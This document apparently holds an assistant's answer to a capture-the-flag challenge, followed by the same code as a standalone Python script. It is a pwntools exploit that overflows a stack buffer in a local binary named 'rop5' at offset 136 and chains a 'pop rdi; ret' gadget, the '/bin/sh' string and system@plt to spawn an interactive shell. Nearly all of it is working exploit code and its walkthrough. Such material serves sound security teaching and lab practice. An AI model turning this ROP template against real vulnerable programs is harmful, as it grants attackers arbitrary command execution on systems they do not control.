("To solve this challenge using pwntools, we'll create an exploit that "
 'overflows the buffer in the `vulnerable_function()` to control the return '
 'address. Since the binary has NX enabled and no stack canary, we can perform '
 "a Return-Oriented Programming (ROP) attack. We'll construct a ROP chain to "
 'call `system("/bin/sh")` and spawn a shell.\n'
 '\n'
 'Here are the steps:\n'
 '1. Use pwntools to interact with the binary.\n'
 '2. Find the offset to overwrite the return address (which is 136 bytes in '
 'this case).\n'
 "3. Use pwntools' `ELF` and `ROP` modules to locate essential addresses:\n"
 '   - Address of `system` function.\n'
 '   - Address of the string `"/bin/sh"` in the binary.\n'
 '   - Address of the `pop rdi; ret` gadget to control the `rdi` register '
 '(first argument to `system`).\n'
 '4. Build the payload with the correct offset and ROP chain.\n'
 '5. Send the payload to the binary and interact with the spawned shell.\n'
 '\n'
 '**Imports:**\n'
 '```python\n'
 'from pwn import *\n'
 '```\n'
 '\n'
 '**Exploit Code:**\n'
 '```python\n'
 'from pwn import *\n'
 '\n'
 '# Load the binary\n'
 "elf = ELF('./pwn/stack/rop-5/rop5')\n"
 '\n'
 '# Start the process\n'
 "p = process('./pwn/stack/rop-5/rop5')\n"
 '\n'
 '# Find the offset to the return address\n'
 'offset = 136  # 128 bytes buffer + 8 bytes saved RBP\n'
 '\n'
 '# Use ROP module to find gadgets\n'
 'rop = ROP(elf)\n'
 "pop_rdi_ret = rop.find_gadget(['pop rdi', 'ret'])[0]\n"
 '\n'
 '# Addresses needed\n'
 "system_plt = elf.plt['system']\n"
 "bin_sh = next(elf.search(b'/bin/sh'))\n"
 '\n'
 '# Build the payload\n'
 "payload = b'A' * offset\n"
 'payload += p64(pop_rdi_ret)\n'
 'payload += p64(bin_sh)\n'
 'payload += p64(system_plt)\n'
 '\n'
 '# Send the payload\n'
 "p.sendlineafter('Hello, World\\n', payload)\n"
 '\n'
 '# Get an interactive shell\n'
 'p.interactive()\n'
 '```\n'
 '\n'
 '**Explanation:**\n'
 '- We import `pwn` from pwntools.\n'
 '- Load the ELF binary to access symbols and addresses.\n'
 '- Start the process to interact with the binary.\n'
 '- Calculate the offset to the return address (136 bytes).\n'
 '- Find the `pop rdi; ret` gadget to control the `rdi` register (required for '
 '64-bit calling convention).\n'
 '- Locate the addresses of `system` in the PLT and the `"/bin/sh"` string in '
 'the binary.\n'
 '- Construct the payload:\n'
 "  - Overflow the buffer with padding (`'A' * 136`).\n"
 '  - Overwrite the return address to our ROP chain:\n'
 '    - `pop rdi; ret` gadget address to control `rdi`.\n'
 '    - Address of `"/bin/sh"` as the argument to `system`.\n'
 '    - Address of `system` function to execute.\n'
 "- Send the payload after the program's initial output (`'Hello, "
 "World\\n'`).\n"
 '- Switch to interactive mode to use the shell.\n'
 '\n'
 '**Note:** Make sure you have pwntools installed (`pip install pwntools`) and '
 'have the correct permissions to execute the binary.')

from pwn import *

# Load the binary
elf = ELF('./pwn/stack/rop-5/rop5')

# Start the process
p = process(elf.path)

# Find the offset to the return address
offset = 136  # 128 bytes buffer + 8 bytes saved RBP

# Use ROP module to find gadgets
rop = ROP(elf)
pop_rdi_ret = rop.find_gadget(['pop rdi', 'ret'])[0]

# Addresses needed
system_plt = elf.plt['system']
bin_sh = next(elf.search(b'/bin/sh'))

# Build the payload
payload = b'A' * offset
payload += p64(pop_rdi_ret)  # Overwrite return address with pop rdi; ret gadget
payload += p64(bin_sh)       # Argument to system: "/bin/sh"
payload += p64(system_plt)   # Call system()

# Send the payload
p.sendlineafter('Hello, World\n', payload)

# Get an interactive shell
p.interactive()